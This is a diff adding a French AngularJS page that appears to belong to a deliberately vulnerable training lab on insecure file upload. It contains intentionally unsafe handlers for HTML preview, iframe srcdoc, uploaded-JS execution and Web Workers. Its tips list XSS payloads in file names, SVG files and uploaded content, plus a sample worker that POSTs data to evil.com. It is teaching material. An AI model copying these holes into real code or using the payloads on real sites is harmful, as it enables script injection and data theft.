@@ -1,0 +1,281 @@
+<div class="panel panel-danger">
+    <div class="panel-heading">
+        <h2>File Upload Non Sécurisé (AngularJS)</h2>
+    </div>
+    <div class="panel-body">
+        
+        <!-- Section 1: Upload de Base -->
+        <div class="well">
+            <h3>1. Upload Sans Validation</h3>
+            <input type="file" onchange="angular.element(this).scope().handleFileUpload(this.files)" 
+                   accept="*/*" class="form-control">
+            <p>Nom du fichier: <span ng-bind="fileName"></span></p>
+            <p class="text-danger">Accepte TOUS les types de fichiers!</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ol>
+                    <li>Créez un fichier <code>test.html</code> avec : <code>&lt;script&gt;alert('Fichier exécuté!')&lt;/script&gt;</code></li>
+                    <li>Uploadez-le</li>
+                    <li>Le contenu sera affiché dans la section 4</li>
+                    <li>Essayez aussi : .js, .svg, .php, .exe - tout passe !</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Section 2: Stockage côté client -->
+        <div class="well">
+            <h3>2. Stockage de Fichiers dans le Navigateur</h3>
+            <button ng-click="storeFileInBrowser()" class="btn btn-danger">
+                Stocker dans localStorage
+            </button>
+            <p class="text-danger">
+                Stocker des fichiers dans localStorage = problèmes de sécurité et performance!
+            </p>
+            <ul>
+                <li>Limite de 5-10MB selon le navigateur</li>
+                <li>Données accessibles via XSS</li>
+                <li>Pas de chiffrement</li>
+            </ul>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ol>
+                    <li>Uploadez un fichier (section 1)</li>
+                    <li>Cliquez "Stocker dans localStorage"</li>
+                    <li>DevTools → Application → Local Storage</li>
+                    <li>Cherchez <code>uploadedFile_*</code></li>
+                    <li>Le fichier entier est stocké en clair !</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Section 3: Affichage du Nom -->
+        <div class="well">
+            <h3>3. XSS via Nom de Fichier</h3>
+            <input type="text" ng-model="fileName" class="form-control" 
+                   placeholder='Nom malveillant (ex: <img src=x onerror=alert(1)>.pdf)'>
+            <button ng-click="processFileName()" class="btn btn-danger">
+                Afficher Nom
+            </button>
+            <div id="filename-display" class="output"></div>
+            <div id="file-link" class="output"></div>
+            
+            <div class="alert alert-info">
+                <strong>💡 Noms de fichiers malveillants :</strong>
+                <ul>
+                    <li><code>&lt;img src=x onerror=alert('Filename XSS')&gt;.pdf</code></li>
+                    <li><code>&lt;svg onload=alert(document.domain)&gt;.doc</code></li>
+                    <li><code>&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;.txt</code></li>
+                    <li><code>"><script>alert('XSS')</script>.jpg</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 4: Preview du Contenu -->
+        <div class="well">
+            <h3>4. Preview du Contenu (HTML/JS)</h3>
+            <div id="file-preview" class="output" style="border: 2px dashed red; padding: 10px;">
+                <!-- Le contenu du fichier sera affiché ici avec innerHTML -->
+            </div>
+            <textarea ng-model="fileContent" class="form-control" rows="4" 
+                      placeholder="Contenu du fichier uploadé"></textarea>
+            <button ng-click="previewHTML()" class="btn btn-danger">Preview HTML</button>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ul>
+                    <li>Contenu malveillant : <code>&lt;img src=x onerror="alert('Preview XSS')"&gt;</code></li>
+                    <li>JavaScript : <code>&lt;script&gt;document.body.style.background='red'&lt;/script&gt;</code></li>
+                    <li>Redirection : <code>&lt;meta http-equiv="refresh" content="0;url=http://evil.com"&gt;</code></li>
+                </ul>
+                <strong>Ou créez un fichier .html malveillant et uploadez-le !</strong>
+            </div>
+        </div>
+
+        <!-- Section 5: Preview iFrame -->
+        <div class="well">
+            <h3>5. Preview dans iFrame</h3>
+            <div id="html-preview"></div>
+            <iframe id="preview-iframe" style="width:100%; height:200px; border:1px solid #ccc;">
+            </iframe>
+            <p class="text-danger">L'iframe exécute le contenu uploadé!</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <p>L'iframe utilise <code>srcdoc</code> qui exécute le HTML/JS !</p>
+                <pre>&lt;script&gt;
+  alert('Exécuté dans iframe!');
+  // Accès au parent possible :
+  window.parent.document.body.style.background = 'yellow';
+&lt;/script&gt;</pre>
+            </div>
+        </div>
+
+        <!-- Section 6: Upload Large Files -->
+        <div class="well">
+            <h3>6. Upload Sans Limite de Taille</h3>
+            <input type="file" onchange="angular.element(this).scope().uploadLargeFile(this.files[0])" 
+                   class="form-control">
+            <p class="text-danger">Aucune limite de taille = DoS potentiel!</p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Impact :</strong>
+                <ul>
+                    <li>Fichier de 100MB → Freeze du navigateur</li>
+                    <li>Fichier de 1GB → Crash possible</li>
+                    <li>Remplissage localStorage → Quota dépassé</li>
+                    <li>CPU à 100% pendant le traitement</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 7: Blob URLs -->
+        <div class="well">
+            <h3>7. Création de Blob URLs Sans Cleanup</h3>
+            <input type="file" onchange="angular.element(this).scope().createBlobURL(this.files[0])" 
+                   class="form-control">
+            <a id="blob-link" href="#" target="_blank">Lien Blob créé</a>
+            <p class="text-danger">
+                URL.createObjectURL() sans URL.revokeObjectURL() = fuite mémoire!
+            </p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour voir la fuite :</strong>
+                <ol>
+                    <li>Uploadez plusieurs fichiers</li>
+                    <li>Ouvrez DevTools → Memory</li>
+                    <li>Prenez un snapshot</li>
+                    <li>Cherchez "Blob" → La mémoire augmente !</li>
+                    <li>Les URLs ne sont jamais libérées</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Section 8: FileReader Synchrone -->
+        <div class="well">
+            <h3>8. FileReader sur Gros Fichiers (UI Freeze)</h3>
+            <input type="file" onchange="angular.element(this).scope().readLargeFileSync(this.files[0])" 
+                   class="form-control">
+            <p class="text-warning">
+                Lire de gros fichiers avec FileReader peut bloquer l'UI!
+            </p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester le freeze :</strong>
+                <ul>
+                    <li>Uploadez un fichier > 10MB</li>
+                    <li>L'UI devient non-responsive</li>
+                    <li>Impossible de cliquer ou scroller</li>
+                    <li>Le traitement bloque le thread principal</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- Section 9: SVG Upload -->
+        <div class="well">
+            <h3>9. Upload SVG avec Scripts</h3>
+            <textarea ng-model="svgContent" class="form-control" rows="3" 
+                      placeholder='<svg><script>alert("XSS in SVG")</script></svg>'></textarea>
+            <button ng-click="uploadSVG(svgContent)" class="btn btn-danger">
+                Upload SVG
+            </button>
+            <div id="svg-container" class="output"></div>
+            
+            <div class="alert alert-info">
+                <strong>💡 SVG malveillants à tester :</strong>
+                <pre>&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+  &lt;script&gt;alert('SVG XSS')&lt;/script&gt;
+&lt;/svg&gt;
+
+&lt;svg onload="alert('SVG onload')"&gt;&lt;/svg&gt;
+
+&lt;svg&gt;
+  &lt;foreignObject&gt;
+    &lt;iframe src="javascript:alert('SVG iframe')"&gt;&lt;/iframe&gt;
+  &lt;/foreignObject&gt;
+&lt;/svg&gt;</pre>
+            </div>
+        </div>
+
+        <!-- Section 10: Exécution de JavaScript Uploadé -->
+        <div class="well">
+            <h3>10. Exécution de Fichiers JavaScript</h3>
+            <button ng-click="executeUploadedJS()" class="btn btn-danger" 
+                    ng-show="fileName.endsWith('.js')">
+                Exécuter le JS Uploadé
+            </button>
+            <p class="text-danger">
+                Exécuter du JavaScript uploadé par l'utilisateur = RCE côté client!
+            </p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Pour tester :</strong>
+                <ol>
+                    <li>Créez un fichier <code>malicious.js</code> :</li>
+                    <pre>alert('JS exécuté !');
+document.body.innerHTML = '&lt;h1&gt;Pwned!&lt;/h1&gt;';
+console.log(document.cookie);
+localStorage.clear(); // Destruction !</pre>
+                    <li>Uploadez-le</li>
+                    <li>Le bouton "Exécuter" apparaît</li>
+                    <li>💥 Code arbitraire exécuté !</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Section 11: Web Workers -->
+        <div class="well">
+            <h3>11. Création de Web Workers depuis Fichiers</h3>
+            <button ng-click="createWorkerFromFile()" class="btn btn-danger">
+                Créer Worker depuis Fichier
+            </button>
+            <p class="text-warning">
+                Workers créés sans validation peuvent exécuter du code malveillant!
+            </p>
+            
+            <div class="alert alert-info">
+                <strong>💡 Worker malveillant :</strong>
+                <pre>// worker.js malveillant
+while(true) {
+  // Boucle infinie = CPU à 100%
+}
+
+// Ou vol de données :
+self.addEventListener('message', function(e) {
+  // Envoie des données au serveur attaquant
+  fetch('http://evil.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(e.data)
+  });
+});</pre>
+            </div>
+        </div>
+
+        <!-- Indicateurs de Vulnérabilités -->
+        <div class="alert alert-danger">
+            <h4>🚨 Vulnérabilités Actives:</h4>
+            <ul>
+                <li>Pas de validation de contenu côté client</li>
+                <li>XSS via noms de fichiers</li>
+                <li>Exécution directe de HTML/JavaScript uploadé</li>
+                <li>Stockage de fichiers dans localStorage</li>
+                <li>Pas de limite de taille côté client</li>
+                <li>Blob URLs non révoquées (fuites mémoire)</li>
+                <li>SVG avec scripts acceptés</li>
+                <li>FileReader bloquant sur gros fichiers</li>
+            </ul>
+            
+            <strong>Bonnes pratiques :</strong>
+            <ul>
+                <li>✅ Valider les types MIME</li>
+                <li>✅ Limiter la taille des fichiers</li>
+                <li>✅ Nettoyer les noms de fichiers</li>
+                <li>✅ Ne jamais exécuter le contenu uploadé</li>
+                <li>✅ Utiliser des Web Workers avec du code validé uniquement</li>
+                <li>✅ Toujours révoquer les Blob URLs</li>
+            </ul>
+        </div>
+
+    </div>
+</div>
